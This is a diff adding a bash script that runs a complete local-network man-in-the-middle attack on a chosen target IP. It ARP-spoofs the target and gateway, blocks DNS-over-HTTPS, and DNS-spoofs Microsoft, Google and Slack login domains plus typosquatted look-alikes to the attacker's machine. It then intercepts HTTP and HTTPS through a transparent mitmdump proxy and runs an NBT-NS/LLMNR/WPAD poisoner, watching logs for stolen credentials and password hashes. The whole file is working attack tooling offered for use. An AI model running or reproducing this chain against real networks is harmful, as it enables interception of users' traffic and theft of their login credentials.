@@ -1,0 +1,119 @@
+#!/usr/bin/env bash
+# Full attack chain: ARP + DNS + mitmdump transparent proxy + Responder
+# Usage: ./commands/attack <target_ip> [duration_seconds]
+
+TARGET="${1:-}"
+DURATION="${2:-120}"
+BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
+NET_IFACE=$(ip route | awk '/default/{print $5; exit}')
+NET_IP=$(ip -4 addr show "$NET_IFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
+NET_GATEWAY=$(ip route | awk '/default/{print $3; exit}')
+DNS_LOG="$BASE_DIR/captures/dns_spoof.log"
+DNS_HOSTS="$BASE_DIR/captures/dns_hosts.txt"
+MITM_LOG="$BASE_DIR/captures/mitmdump.log"
+CREDS_LOG="$BASE_DIR/captures/creds_found.txt"
+
+DOH_IPS="8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1 9.9.9.9 149.112.112.112"
+
+if [[ -z "$TARGET" ]]; then
+    echo "Usage: $0 <target_ip> [duration_seconds]"
+    echo "Ex:    $0 172.17.200.25 300"
+    exit 1
+fi
+
+echo "[+] Target: $TARGET"
+echo "[+] Our IP: $NET_IP (gw: $NET_GATEWAY)"
+echo "[+] Duration: ${DURATION}s"
+echo ""
+
+cleanup() {
+    echo "[*] Cleaning up..."
+    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
+    pkill -f "arpspoof" 2>/dev/null
+    pkill -f "dnsspoof" 2>/dev/null
+    pkill -f "fake_login" 2>/dev/null
+    pkill -f "mitmdump" 2>/dev/null
+    pkill -f "responder_targeted" 2>/dev/null
+    pkill -f "mitm_intercept" 2>/dev/null
+
+    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
+    iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null
+    iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null
+    iptables -t nat -D POSTROUTING -o "$NET_IFACE" -j MASQUERADE 2>/dev/null
+    iptables -D FORWARD -i "$NET_IFACE" -j ACCEPT 2>/dev/null
+
+    for ip in $DOH_IPS; do
+        iptables -t raw -D PREROUTING -d "$ip" -p tcp --dport 443 -j DROP 2>/dev/null
+    done
+
+    echo "[*] Done."
+}
+trap cleanup EXIT INT TERM
+
+# Step 1: Enable IP forwarding + NAT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o "$NET_IFACE" -j MASQUERADE 2>/dev/null
+iptables -A FORWARD -i "$NET_IFACE" -j ACCEPT 2>/dev/null
+
+# Step 2: Block DNS-over-HTTPS
+echo "[+] Blocking DoH providers..."
+for ip in $DOH_IPS; do
+    iptables -t raw -A PREROUTING -d "$ip" -p tcp --dport 443 -j DROP
+done
+
+# Step 3: Redirect DNS traffic
+iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
+
+# Step 4: ARP spoof both directions
+echo "[+] ARP spoofing $TARGET..."
+arpspoof -i "$NET_IFACE" -t "$TARGET" "$NET_GATEWAY" > /dev/null 2>&1 &
+arpspoof -i "$NET_IFACE" -t "$NET_GATEWAY" "$TARGET" > /dev/null 2>&1 &
+
+# Step 5: DNS spoof
+echo "[+] DNS spoof ready..."
+> "$DNS_HOSTS"
+# ADD adalove to DNS spoof
+# Typosquat domains (adalove resolves to real IP, no DNS spoof)
+for d in login.microsoftonline.com login.live.com outlook.office365.com www.office.com \
+         accounts.google.com mail.google.com docs.google.com drive.google.com \
+         services.m3.maas360.com wss-backup.slack.com app.slack.com \
+         login.microsoftonllne.com login.microsoftonIine.com \
+         login.rnicrosoftonline.com rnicrosoftonline.com \
+         accounts.googie.com accounts.g00gle.com; do
+    echo "$NET_IP $d" >> "$DNS_HOSTS"
+done
+nohup dnsspoof -i "$NET_IFACE" -f "$DNS_HOSTS" > "$DNS_LOG" 2>&1 &
+
+# Step 6: mitmdump transparent proxy
+echo "[+] Starting mitmdump (lazy upstream)..."
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+nohup mitmdump --mode transparent --showhost --listen-port 8080 \
+    --set ssl_insecure=true \
+    --set connection_strategy=lazy \
+    --set stream_large_bodies=5m \
+    -s "$BASE_DIR/tools/mitm_intercept.py" \
+    >> "$MITM_LOG" 2>&1 &
+
+# Step 7: NBT-NS/LLMNR/mDNS/WPAD responder
+echo "[+] Multi-protocol responder (NBT-NS/LLMNR/mDNS/WPAD/SMB)..."
+nohup python3 "$BASE_DIR/tools/responder_targeted.py" "$NET_IP" > "$BASE_DIR/captures/responder.log" 2>&1 &
+
+echo ""
+echo "[+] Attack running for ${DURATION}s against $TARGET"
+echo "[+] Creds will be saved to: $CREDS_LOG"
+echo "[+] Ctrl+C to stop early"
+echo ""
+
+RESPONDER_LOG="$BASE_DIR/captures/responder_hashes.txt"
+for ((i=DURATION; i>0; i-=10)); do
+    sleep 10
+    if [[ -s "$CREDS_LOG" ]]; then
+        echo "[!] CRED: $(tail -1 "$CREDS_LOG")"
+    fi
+    if [[ -s "$RESPONDER_LOG" ]]; then
+        echo "[!] HASH: $(tail -1 "$RESPONDER_LOG")"
+    fi
+done
+
+echo "[*] Attack complete."
